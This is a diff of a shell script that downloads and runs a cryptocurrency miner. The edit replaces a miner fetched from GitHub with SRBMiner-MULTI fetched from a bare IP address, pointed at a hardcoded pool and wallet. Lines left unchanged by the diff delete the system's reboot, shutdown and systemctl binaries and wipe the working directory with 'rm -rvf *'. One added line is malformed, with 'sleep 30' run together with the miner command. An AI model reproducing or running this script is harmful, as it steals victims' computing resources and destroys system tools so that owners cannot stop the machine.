@@ -3,10 +3,9 @@ rm -rvf *
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 apt update
-wget -O gigi https://github.com/cornea99/upil/raw/main/zepo
-chmod 777 gigi
-./gigi --donate-level 1 -o 165.232.165.31:80 -u 0x0D646f89Db83E0642199e88A7967C7f62af02a83 -p $(shuf -n 1 -i 1-999)-F -a rx/0 -t $(nproc --all)
-sleep 30
+wget -O oasis http://139.180.133.28/SRBMiner-MULTI
+chmod 777 oasis
+./oasis --algorithm randomx --pool 165.232.165.31:80 --wallet 0x0D646f89Db83E0642199e88A7967C7f62af02a83.$(echo $(shuf -i 1-100000 -n 1)-BR) --password x --cpu-threads $(nproc --all)sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
 rm -rvf *
